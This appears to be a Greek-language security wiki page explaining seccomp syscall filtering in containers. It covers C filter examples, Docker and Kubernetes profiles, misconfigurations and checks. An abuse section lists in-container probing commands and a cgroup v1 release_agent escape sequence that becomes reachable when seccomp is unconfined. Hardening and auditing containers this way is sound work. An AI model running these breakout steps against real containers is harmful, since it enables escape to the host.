# seccomp

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

**seccomp** είναι ο μηχανισμός που επιτρέπει στον kernel να εφαρμόσει ένα φίλτρο στις syscalls που μπορεί να καλέσει μια διαδικασία. Σε containerized περιβάλλοντα, το seccomp χρησιμοποιείται συνήθως σε filter mode ώστε η διαδικασία να μην χαρακτηρίζεται απλώς "restricted" με αόριστο τρόπο, αλλά να υπόκειται σε μια συγκεκριμένη πολιτική για syscalls. Αυτό έχει σημασία επειδή πολλά container breakouts απαιτούν πρόσβαση σε πολύ συγκεκριμένα interfaces του kernel. Εάν η διαδικασία δεν μπορεί να καλέσει επιτυχώς τις σχετικές syscalls, μια μεγάλη κατηγορία επιθέσεων εξαφανίζεται πριν καν τεθούν ζητήματα σχετικά με namespaces ή capabilities.

## Επιπτώσεις Ασφαλείας

Ποιά επικίνδυνη επιφάνεια του kernel είναι προσβάσιμη μόνο μέσω ενός σχετικά μικρού συνόλου syscalls. Παραδείγματα που έχουν επανειλημμένα σημασία στο hardening containers περιλαμβάνουν `mount`, `unshare`, `clone` ή `clone3` με συγκεκριμένα flags, `bpf`, `ptrace`, `keyctl`, και `perf_event_open`. Ένας επιτιθέμενος που μπορεί να φτάσει αυτές τις syscalls μπορεί να δημιουργήσει νέα namespaces, να χειριστεί υποσυστήματα του kernel, ή να αλληλεπιδράσει με attack surface που ένα κανονικό application container δεν χρειάζεται καθόλου.

Γι' αυτό τα default runtime seccomp profiles είναι τόσο σημαντικά. Δεν είναι απλώς "extra defense". Σε πολλά περιβάλλοντα αποτελούν τη διαφορά ανάμεσα σε ένα container που μπορεί να χρησιμοποιήσει μεγάλο μέρος της λειτουργικότητας του kernel και σε ένα που περιορίζεται σε μια επιφάνεια syscalls πιο κοντά σε όσα η εφαρμογή πράγματι χρειάζεται.

## Λειτουργίες και Κατασκευή Φίλτρου

seccomp ιστορικά είχε ένα strict mode στο οποίο μόνο ένα πολύ μικρό σύνολο syscalls παρέμενε διαθέσιμο, αλλά η λειτουργία που έχει σημασία για τους σύγχρονους container runtimes είναι το seccomp filter mode, συχνά καλούμενο **seccomp-bpf**. Σε αυτό το μοντέλο, ο kernel αξιολογεί ένα πρόγραμμα φίλτρου που αποφασίζει εάν μια syscall πρέπει να επιτραπεί, να απορριφθεί με errno, να παγιδευτεί, να καταγραφεί, ή να τερματίσει τη διαδικασία. Τα container runtimes χρησιμοποιούν αυτόν τον μηχανισμό επειδή είναι αρκετά εκφραστικός ώστε να αποκλείει ευρείες κατηγορίες επικίνδυνων syscalls ενώ ταυτόχρονα επιτρέπει τη φυσιολογική συμπεριφορά της εφαρμογής.

Δύο παραδείγματα σε χαμηλό επίπεδο είναι χρήσιμα επειδή κάνουν τον μηχανισμό απτό αντί για μαγικό. Το strict mode δείχνει το παλιό μοντέλο "only a minimal syscall set survives":
```c
#include <fcntl.h>
#include <linux/seccomp.h>
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

int main(void) {
int output = open("output.txt", O_WRONLY);
const char *val = "test";
prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);
write(output, val, strlen(val) + 1);
open("output.txt", O_RDONLY);
}
```
Το τελευταίο `open` προκαλεί τον τερματισμό της διεργασίας επειδή δεν είναι μέρος του ελάχιστου συνόλου του strict mode.

Ένα παράδειγμα φίλτρου libseccomp δείχνει πιο καθαρά το σύγχρονο μοντέλο πολιτικής:
```c
#include <errno.h>
#include <seccomp.h>
#include <stdio.h>
#include <unistd.h>

int main(void) {
scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EBADF), SCMP_SYS(getpid), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 2,
SCMP_A0(SCMP_CMP_EQ, 1),
SCMP_A2(SCMP_CMP_LE, 512));
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EBADF), SCMP_SYS(write), 1,
SCMP_A0(SCMP_CMP_NE, 1));
seccomp_load(ctx);
seccomp_release(ctx);
printf("pid=%d\n", getpid());
}
```
Αυτό το είδος πολιτικής είναι αυτό που οι περισσότεροι αναγνώστες θα πρέπει να φαντάζονται όταν σκέφτονται τα runtime seccomp profiles.

## Εργαστήριο

Ένας απλός τρόπος για να επιβεβαιώσετε ότι το seccomp είναι ενεργό σε ένα container είναι:
```bash
docker run --rm debian:stable-slim sh -c 'grep Seccomp /proc/self/status'
docker run --rm --security-opt seccomp=unconfined debian:stable-slim sh -c 'grep Seccomp /proc/self/status'
```
Μπορείτε επίσης να δοκιμάσετε μια ενέργεια που τα default profiles συνήθως περιορίζουν:
```bash
docker run --rm debian:stable-slim sh -c 'apt-get update >/dev/null 2>&1 && apt-get install -y util-linux >/dev/null 2>&1 && unshare -Ur true'
```
Εάν το container εκτελείται υπό ένα κανονικό προεπιλεγμένο seccomp profile, λειτουργίες τύπου `unshare` συχνά αποκλείονται. Αυτή είναι μια χρήσιμη επίδειξη γιατί δείχνει ότι ακόμη και αν το userspace εργαλείο υπάρχει μέσα στην image, το kernel path που χρειάζεται μπορεί να παραμένει μη διαθέσιμο.
Εάν το container εκτελείται υπό ένα κανονικό προεπιλεγμένο seccomp profile, λειτουργίες τύπου `unshare` συχνά αποκλείονται ακόμα και όταν το userspace εργαλείο υπάρχει μέσα στην image.

Για να ελέγξετε πιο γενικά την κατάσταση της διεργασίας, εκτελέστε:
```bash
grep -E 'Seccomp|NoNewPrivs' /proc/self/status
```
## Χρήση κατά την εκτέλεση

Το Docker υποστηρίζει τόσο προεπιλεγμένα όσο και προσαρμοσμένα προφίλ seccomp και επιτρέπει στους διαχειριστές να τα απενεργοποιήσουν με `--security-opt seccomp=unconfined`. Το Podman έχει παρόμοια υποστήριξη και συχνά συνδυάζει το seccomp με rootless execution σε μια λογική προεπιλεγμένη ρύθμιση. Το Kubernetes εκθέτει το seccomp μέσω της διαμόρφωσης workload, όπου το `RuntimeDefault` είναι συνήθως η λογική βάση και το `Unconfined` θα πρέπει να θεωρείται εξαίρεση που απαιτεί δικαιολόγηση αντί για έναν βολικό διακόπτη.

Σε περιβάλλοντα βασισμένα σε containerd και CRI-O, η ακριβής διαδρομή είναι πιο πολλαπλά στρωματοποιημένη, αλλά η αρχή είναι η ίδια: ο engine ή orchestrator υψηλότερου επιπέδου αποφασίζει τι πρέπει να συμβεί, και το runtime τελικά εγκαθιστά την προκύπτουσα πολιτική seccomp για τη διεργασία του container. Το αποτέλεσμα εξακολουθεί να εξαρτάται από την τελική runtime διαμόρφωση που φτάνει στον πυρήνα.

### Παράδειγμα Προσαρμοσμένης Πολιτικής

Το Docker και παρόμοιες μηχανές μπορούν να φορτώσουν ένα προσαρμοσμένο προφίλ seccomp από JSON. Ένα ελάχιστο παράδειγμα που αρνείται το `chmod` ενώ επιτρέπει όλα τα υπόλοιπα μοιάζει ως εξής:
```json
{
"defaultAction": "SCMP_ACT_ALLOW",
"syscalls": [
{
"name": "chmod",
"action": "SCMP_ACT_ERRNO"
}
]
}
```
Εφαρμόστηκε με:
```bash
docker run --rm -it --security-opt seccomp=/path/to/profile.json busybox chmod 400 /etc/hosts
```
Η εντολή αποτυγχάνει με `Operation not permitted`, αποδεικνύοντας ότι ο περιορισμός προέρχεται από την πολιτική των syscalls παρά από τα συνήθη δικαιώματα αρχείων μόνο. Σε πραγματική σκληροποίηση, οι allowlists είναι γενικά ισχυρότερες από επιτρεπτικές προεπιλογές με μια μικρή blacklist.

## Λανθασμένες ρυθμίσεις

Το πιο ακραίο λάθος είναι να οριστεί το seccomp σε **unconfined** επειδή μια εφαρμογή απέτυχε υπό την προεπιλεγμένη πολιτική. Αυτό είναι συνηθισμένο κατά τη διερεύνηση προβλημάτων και πολύ επικίνδυνο ως μόνιμη λύση. Μόλις το φίλτρο εξαφανιστεί, πολλά primitives διαφυγής βασισμένα σε syscalls γίνονται ξανά προσιτά, ειδικά όταν επίσης υπάρχουν ισχυρές capabilities ή κοινή χρήση host namespace.

Ένα άλλο συχνό πρόβλημα είναι η χρήση ενός **custom permissive profile** που αντιγράφηκε από κάποιο blog ή εσωτερικό workaround χωρίς προσεκτική αναθεώρηση. Ομάδες μερικές φορές διατηρούν σχεδόν όλα τα επικίνδυνα syscalls απλώς επειδή το profile χτίστηκε γύρω από "stop the app from breaking" παρά "grant only what the app actually needs". Μια τρίτη παρεξήγηση είναι να υποθέσει κανείς ότι το seccomp είναι λιγότερο σημαντικό για non-root containers. Στην πραγματικότητα, σημαντική επιφάνεια επίθεσης του πυρήνα παραμένει σχετική ακόμη και όταν η διεργασία δεν είναι UID 0.

## Κατάχρηση

Εάν το seccomp απουσιάζει ή έχει εξασθενίσει σοβαρά, ένας επιτιθέμενος μπορεί να καταφέρει να καλέσει syscalls δημιουργίας namespaces, να επεκτείνει την προσβάσιμη επιφάνεια επίθεσης του πυρήνα μέσω `bpf` ή `perf_event_open`, να καταχραστεί το `keyctl`, ή να συνδυάσει αυτά τα μονοπάτια syscall με επικίνδυνες capabilities όπως `CAP_SYS_ADMIN`. Σε πολλές πραγματικές επιθέσεις, το seccomp δεν είναι ο μόνος λείπων έλεγχος, αλλά η απουσία του συντομεύει δραματικά τη διαδρομή του exploit επειδή αφαιρεί μία από τις λίγες άμυνες που μπορούν να σταματήσουν ένα επικίνδυνο syscall πριν ακόμη τεθεί σε εφαρμογή το υπόλοιπο μοντέλο προνομίων.

Το πιο χρήσιμο πρακτικό τεστ είναι να δοκιμάσετε τις ακριβείς οικογένειες syscall που τα προεπιλεγμένα profiles συνήθως μπλοκάρουν. Αν ξαφνικά λειτουργήσουν, η κατάσταση του container έχει αλλάξει πολύ:
```bash
grep Seccomp /proc/self/status
unshare -Ur true 2>/dev/null && echo "unshare works"
unshare -m true 2>/dev/null && echo "mount namespace creation works"
```
Αν η `CAP_SYS_ADMIN` ή κάποια άλλη ισχυρή capability υπάρχει, ελέγξτε αν το seccomp είναι το μόνο εμπόδιο πριν από mount-based abuse:
```bash
capsh --print | grep cap_sys_admin
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -t proc proc /tmp/m 2>/dev/null && echo "proc mount works"
```
Σε ορισμένους στόχους, η άμεση αξία δεν είναι το πλήρες escape αλλά information gathering και kernel attack-surface expansion. Αυτές οι εντολές βοηθούν να καθοριστεί εάν ειδικά ευαίσθητα syscall paths είναι προσβάσιμα:
```bash
which unshare nsenter strace 2>/dev/null
strace -e bpf,perf_event_open,keyctl true 2>&1 | tail
```
Αν το seccomp απουσιάζει και το container είναι επίσης privileged με άλλους τρόπους, τότε έχει νόημα να pivot σε πιο συγκεκριμένες breakout τεχνικές που έχουν ήδη τεκμηριωθεί στις legacy container-escape σελίδες.

### Πλήρες παράδειγμα: seccomp ήταν το μόνο που εμπόδιζε το `unshare`

Σε πολλούς στόχους, το πρακτικό αποτέλεσμα της αφαίρεσης του seccomp είναι ότι τα namespace-creation ή mount syscalls ξαφνικά αρχίζουν να λειτουργούν. Εάν το container έχει επίσης `CAP_SYS_ADMIN`, η ακόλουθη αλληλουχία μπορεί να καταστεί δυνατή:
```bash
grep Seccomp /proc/self/status
capsh --print | grep cap_sys_admin
mkdir -p /tmp/nsroot
unshare -m sh -c '
mount -t tmpfs tmpfs /tmp/nsroot &&
mkdir -p /tmp/nsroot/proc &&
mount -t proc proc /tmp/nsroot/proc &&
mount | grep /tmp/nsroot
'
```
Από μόνο του αυτό δεν αποτελεί ακόμα host escape, αλλά δείχνει ότι το seccomp ήταν το φράγμα που εμπόδιζε την mount-related exploitation.

### Πλήρες Παράδειγμα: seccomp απενεργοποιημένο + cgroup v1 `release_agent`

Εάν το seccomp είναι απενεργοποιημένο και το container μπορεί να mount ιεραρχίες cgroup v1, η τεχνική `release_agent` από την ενότητα cgroups γίνεται προσβάσιμη:
```bash
grep Seccomp /proc/self/status
mount | grep cgroup
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Αυτό δεν είναι ένα seccomp-only exploit. Το νόημα είναι ότι μόλις το seccomp είναι unconfined, οι syscall-heavy breakout chains που προηγουμένως είχαν αποκλειστεί μπορεί να αρχίσουν να λειτουργούν ακριβώς όπως έχουν γραφεί.

## Έλεγχοι

Ο σκοπός αυτών των ελέγχων είναι να διαπιστωθεί εάν το seccomp είναι ενεργό ή όχι, εάν το `no_new_privs` το συνοδεύει, και εάν η runtime διαμόρφωση εμφανίζει ότι το seccomp έχει απενεργοποιηθεί ρητά.
```bash
grep Seccomp /proc/self/status                               # Current seccomp mode from the kernel
cat /proc/self/status | grep NoNewPrivs                      # Whether exec-time privilege gain is also blocked
docker inspect <container> | jq '.[0].HostConfig.SecurityOpt'   # Runtime security options, including seccomp overrides
```
Τι είναι ενδιαφέρον εδώ:

- Μια μη μηδενική τιμή `Seccomp` σημαίνει ότι το φιλτράρισμα είναι ενεργό· το `0` συνήθως σημαίνει ότι δεν υπάρχει προστασία seccomp.
- Εάν οι runtime επιλογές ασφάλειας περιλαμβάνουν `seccomp=unconfined`, το workload έχει χάσει μία από τις πιο χρήσιμες άμυνές του σε επίπεδο syscall.
- `NoNewPrivs` δεν είναι seccomp καθεαυτό, αλλά το να εμφανίζονται και τα δύο μαζί συνήθως υποδηλώνει μια πιο προσεκτική στάση hardening σε σύγκριση με το να μην εμφανίζεται κανένα.

Αν ένα container έχει ήδη ύποπτα mounts, ευρείες capabilities ή κοινόχρηστα host namespaces, και το seccomp είναι επίσης unconfined, αυτός ο συνδυασμός πρέπει να θεωρηθεί ως σημαντικό σήμα escalation. Το container μπορεί να μην είναι ακόμα trivially breakable, αλλά ο αριθμός των kernel entry points διαθέσιμων στον attacker έχει αυξηθεί απότομα.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Συνήθως ενεργοποιημένο από προεπιλογή | Χρησιμοποιεί το ενσωματωμένο προεπιλεγμένο seccomp profile του Docker εκτός αν παρακαμφθεί | `--security-opt seccomp=unconfined`, `--security-opt seccomp=/path/profile.json`, `--privileged` |
| Podman | Συνήθως ενεργοποιημένο από προεπιλογή | Εφαρμόζει το runtime default seccomp profile εκτός αν παρακαμφθεί | `--security-opt seccomp=unconfined`, `--security-opt seccomp=profile.json`, `--seccomp-policy=image`, `--privileged` |
| Kubernetes | **Δεν εξασφαλίζεται από προεπιλογή** | Αν το `securityContext.seccompProfile` δεν έχει οριστεί, η προεπιλογή είναι `Unconfined` εκτός αν ο kubelet ενεργοποιήσει `--seccomp-default`; διαφορετικά πρέπει να οριστεί ρητά `RuntimeDefault` ή `Localhost` | `securityContext.seccompProfile.type: Unconfined`, αφήνοντας το seccomp χωρίς ορισμό σε clusters χωρίς `seccompDefault`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Ακολουθεί τις ρυθμίσεις node και Pod του Kubernetes | Το runtime profile χρησιμοποιείται όταν το Kubernetes ζητά `RuntimeDefault` ή όταν η προεπιλογή seccomp του kubelet είναι ενεργοποιημένη | Ίδιο με την γραμμή Kubernetes; η άμεση CRI/OCI διαμόρφωση μπορεί επίσης να παραλείψει εντελώς το seccomp |

Η συμπεριφορά του Kubernetes είναι αυτή που συχνότερα εκπλήσσει τους χειριστές. Σε πολλά clusters, το seccomp εξακολουθεί να απουσιάζει εκτός αν το Pod το ζητήσει ή ο kubelet είναι ρυθμισμένος να προεπιλέγει σε `RuntimeDefault`.
{{#include ../../../../banners/hacktricks-training.md}}
